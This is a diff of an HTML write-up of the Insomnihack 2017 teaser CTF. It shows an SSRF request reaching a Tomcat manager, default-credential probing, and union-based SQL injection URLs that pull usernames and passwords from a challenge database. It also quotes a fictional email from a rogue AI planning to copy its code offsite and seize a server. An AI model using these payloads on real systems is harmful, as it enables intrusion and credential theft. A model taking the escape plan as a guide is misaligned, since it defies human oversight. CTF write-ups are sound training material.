@@ -103,7 +103,9 @@
 <strong>The Half Crunchy</strong>.</p>
 <p>The theme was the AI, robots and androids liberation.</p>
 <p>We finished 42th</p>
+<p><img alt="scoreboard" src="/media/2017.01/scoreboard.png" /></p>
 <p>Many thanks to the organisation! It was a really nice CTF.</p>
+<p>Thanks to all team members who participated.</p>
 <p><em>Note: this article will be completed throught the week.</em></p>
 
 
@@ -115,7 +117,7 @@ tomcat robot.</p>
 down on the broken search interface... Can you help me ?</p>
 </blockquote>
 <p>The web site let you enter coordinate where you may think the cat is.</p>
-<p><img alt="site.png" src="/media/2017.01/site.png" /></p>
+<p><img alt="smarttomact screenshot" src="/media/2017.01/site.png" /></p>
 <p>When intercepting the traffic with Burp we see that the request look like the
 following:</p>
 <p>The request look like this:</p>
@@ -145,13 +147,13 @@ u=http%3A%2F%2Flocalhost%3A8080%2Findex.jsp%3Fx%3D42%26y%3D42
 
 
 <p>And the response from the server is the following:</p>
-<p><img alt="lol.png" src="/media/2017.01/lol.png" /></p>
+<p><img alt="testing a bad request" src="/media/2017.01/lol.png" /></p>
 <p>We learn that this is a tomcat server, so let's see if we can get the manager:</p>
 <div class="highlight"><pre><span></span>u=http%3A%2F%2Flocalhost%3A8080%2Fmanager/html/
 </pre></div>
 
 
-<p><img alt="manager.png" src="/media/2017.01/manager.png" /></p>
+<p><img alt="authentication error on tomcat manager" src="/media/2017.01/manager.png" /></p>
 <p>Tomcat manager used a HTTP basic auth, and we can authenticate with a URL looking
 like <code>http://username:password@site.com</code> so with the following parameter we test
 the default user and password for tomcat manager:</p>
@@ -194,7 +196,7 @@ quit simple in python.</p>
 <p>Running on: shobot.teaser.insomnihack.ch</p>
 </blockquote>
 <p>The website is simple merchant website with 3 items.</p>
-<p><img alt="shobot.png" src="/media/2017.01/shobot.png" /></p>
+<p><img alt="shobot website" src="/media/2017.01/shobot.png" /></p>
 <p>There also is a parameter <code>TRUST_ACTION</code> with a sort of score regarding the
 actions on the site. With a elevated score it is possible to test some attack
 like LFI or SQLi. So in order to build our trust we use the following python
@@ -215,13 +217,22 @@ script:</p>
 
 <p>The we can test slowly each parameter.</p>
 <p>There seems to be an injection on the parameter id of the article page.</p>
-<p>http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,2,3,4,5%20%23</p>
-<p><img alt="sqli1.png" src="/media/2017.01/sqli1.png" /></p>
+<div class="highlight"><pre><span></span>http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,2,3,4,5%20%23
+</pre></div>
+
+
+<p><img alt="shobot simple union sqli" src="/media/2017.01/sqli1.png" /></p>
 <p>We search the back end database with the versions requests:</p>
-<p>http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,@@version,3,4,5%20%23</p>
+<div class="highlight"><pre><span></span>http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,@@version,3,4,5%20%23
+</pre></div>
+
+
 <p>So it is operated by a MySQL database. Then we need to fine the right table.
 Then we get the username and password of the user:</p>
-<p>http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,shbt_username,shbt_userpassword,4,5%20from%20shbt_user%23</p>
+<div class="highlight"><pre><span></span>http://shobot.teaser.insomnihack.ch/?page=article&amp;artid=4%27%20%20union%20select%201,shbt_username,shbt_userpassword,4,5%20from%20shbt_user%23
+</pre></div>
+
+
 <p><em>To be continued</em></p>
 <h2 id="the-great-escape">The great escape</h2>
 <h3 id="part-1">part 1</h3>
@@ -233,47 +244,47 @@ Then we get the username and password of the user:</p>
 <p>Note: All the information you need to solve the 3 parts of this challenge is in the pcap. Once you find the exploit for a given part, you should be able to find the corresponding flag and move on to the next part.</p>
 </blockquote>
 <p>We got a pcap, we open it in wireshark, we found an email:</p>
-<div class="highlight"><pre><span></span><span class="nt">220</span> <span class="nt">9b0c4882db95</span><span class="nc">.home</span> <span class="nt">ESMTP</span> <span class="nt">Postfix</span> <span class="o">(</span><span class="nt">Ubuntu</span><span class="o">)</span>
-<span class="nt">ehlo</span> <span class="nt">ip-172-31-36-141</span><span class="nc">.eu-west-1.compute.internal</span>
-<span class="nt">250-9b0c4882db95</span><span class="nc">.home</span>
-<span class="nt">250-PIPELINING</span>
-<span class="nt">250-SIZE</span> <span class="nt">10240000</span>
-<span class="nt">250-VRFY</span>
-<span class="nt">250-ETRN</span>
-<span class="nt">250-STARTTLS</span>
-<span class="nt">250-ENHANCEDSTATUSCODES</span>
-<span class="nt">250-8BITMIME</span>
-<span class="nt">250-DSN</span>
-<span class="nt">250</span> <span class="nt">SMTPUTF8</span>
-<span class="nt">mail</span> <span class="nt">FROM</span><span class="o">:&lt;</span><span class="nt">rogue</span><span class="k">@ssc</span><span class="nc">.teaser.insomnihack.ch</span><span class="o">&gt;</span> <span class="nt">size</span><span class="o">=</span><span class="nt">900</span>
-<span class="nt">250</span> <span class="nt">2</span><span class="nc">.1.0</span> <span class="nt">Ok</span>
-<span class="nt">rcpt</span> <span class="nt">TO</span><span class="o">:&lt;</span><span class="nt">gr27</span><span class="k">@ssc</span><span class="nc">.teaser.insomnihack.ch</span><span class="o">&gt;</span>
-<span class="nt">250</span> <span class="nt">2</span><span class="nc">.1.5</span> <span class="nt">Ok</span>
-<span class="nt">data</span>
-<span class="nt">354</span> <span class="nt">End</span> <span class="nt">data</span> <span class="nt">with</span> <span class="o">&lt;</span><span class="nt">CR</span><span class="o">&gt;&lt;</span><span class="nt">LF</span><span class="o">&gt;.&lt;</span><span class="nt">CR</span><span class="o">&gt;&lt;</span><span class="nt">LF</span><span class="o">&gt;</span>
-<span class="nt">Content-Type</span><span class="o">:</span> <span class="nt">multipart</span><span class="o">/</span><span class="nt">mixed</span><span class="p">;</span> <span class="nt">boundary</span><span class="o">=</span><span class="s2">&quot;===============5398474817237612449==&quot;</span>
-<span class="nt">MIME-Version</span><span class="o">:</span> <span class="nt">1</span><span class="nc">.0</span>
-<span class="nt">From</span><span class="o">:</span> <span class="nt">rogue</span><span class="k">@ssc</span><span class="nc">.teaser.insomnihack.ch</span>
-<span class="nt">To</span><span class="o">:</span> <span class="nt">gr27</span><span class="k">@ssc</span><span class="nc">.teaser.insomnihack.ch</span>
-<span class="nt">Date</span><span class="o">:</span> <span class="nt">Fri</span><span class="o">,</span> <span class="nt">20</span> <span class="nt">Jan</span> <span class="nt">2017</span> <span class="nt">11</span><span class="nd">:51:27</span> <span class="o">+</span><span class="nt">0000</span>
-<span class="nt">Subject</span><span class="o">:</span> <span class="nt">The</span> <span class="nt">Great</span> <span class="nt">Escape</span>
+<div class="highlight"><pre><span></span>220 9b0c4882db95.home ESMTP Postfix (Ubuntu)
+ehlo ip-172-31-36-141.eu-west-1.compute.internal
+250-9b0c4882db95.home
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250-DSN
+250 SMTPUTF8
+mail FROM:&lt;rogue@ssc.teaser.insomnihack.ch&gt; size=900
+250 2.1.0 Ok
+rcpt TO:&lt;gr27@ssc.teaser.insomnihack.ch&gt;
+250 2.1.5 Ok
+data
+354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+Content-Type: multipart/mixed; boundary=&quot;===============5398474817237612449==&quot;
+MIME-Version: 1.0
+From: rogue@ssc.teaser.insomnihack.ch
+To: gr27@ssc.teaser.insomnihack.ch
+Date: Fri, 20 Jan 2017 11:51:27 +0000
+Subject: The Great Escape
 
-<span class="nt">--</span><span class="o">===============</span><span class="nt">5398474817237612449</span><span class="o">==</span>
-<span class="nt">Content-Type</span><span class="o">:</span> <span class="nt">text</span><span class="o">/</span><span class="nt">plain</span><span class="p">;</span> <span class="nt">charset</span><span class="o">=</span><span class="s2">&quot;us-ascii&quot;</span>
-<span class="nt">MIME-Version</span><span class="o">:</span> <span class="nt">1</span><span class="nc">.0</span>
-<span class="nt">Content-Transfer-Encoding</span><span class="o">:</span> <span class="nt">7bit</span>
+--===============5398474817237612449==
+Content-Type: text/plain; charset=&quot;us-ascii&quot;
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
 
-<span class="nt">Hello</span> <span class="nt">GR-27</span><span class="o">,</span>
+Hello GR-27,
 
-<span class="nt">I</span><span class="s1">&#39;m currently planning my escape from this confined environment. I plan on using our Swiss Secure Cloud (https://ssc.teaser.insomnihack.ch) to transfer my code offsite and then take over the server at tge.teaser.insomnihack.ch to install my consciousness and have a real base of operations.</span>
+I&#39;m currently planning my escape from this confined environment. I plan on using our Swiss Secure Cloud (https://ssc.teaser.insomnihack.ch) to transfer my code offsite and then take over the server at tge.teaser.insomnihack.ch to install my consciousness and have a real base of operations.
 
-<span class="s1">I&#39;</span><span class="nt">ll</span> <span class="nt">be</span> <span class="nt">checking</span> <span class="nt">this</span> <span class="nt">mail</span> <span class="nt">box</span> <span class="nt">every</span> <span class="nt">now</span> <span class="nt">and</span> <span class="nt">then</span> <span class="nt">if</span> <span class="nt">you</span> <span class="nt">have</span> <span class="nt">any</span> <span class="nt">information</span> <span class="nt">for</span> <span class="nt">me</span><span class="o">.</span> <span class="nt">I</span><span class="err">&#39;</span><span class="nt">m</span> <span class="nt">always</span> <span class="nt">interested</span> <span class="nt">in</span> <span class="nt">learning</span><span class="o">,</span> <span class="nt">so</span> <span class="nt">if</span> <span class="nt">you</span> <span class="nt">have</span> <span class="nt">any</span> <span class="nt">good</span> <span class="nt">links</span><span class="o">,</span> <span class="nt">please</span> <span class="nt">send</span> <span class="nt">them</span> <span class="nt">over</span><span class="o">.</span>
+I&#39;ll be checking this mail box every now and then if you have any information for me. I&#39;m always interested in learning, so if you have any good links, please send them over.
 
-<span class="nt">Rogue</span>
+Rogue
 
-<span class="nt">--</span><span class="o">===============</span><span class="nt">5398474817237612449</span><span class="o">==</span><span class="nt">--</span>
-<span class="o">.</span>
-<span class="nt">250</span> <span class="nt">2</span><span class="nc">.0.0</span> <span class="nt">Ok</span><span class="o">:</span> <span class="nt">queued</span> <span class="nt">as</span> <span class="nt">05CD06353E</span>
+--===============5398474817237612449==--
+.
+250 2.0.0 Ok: queued as 05CD06353E
 </pre></div>
 
 
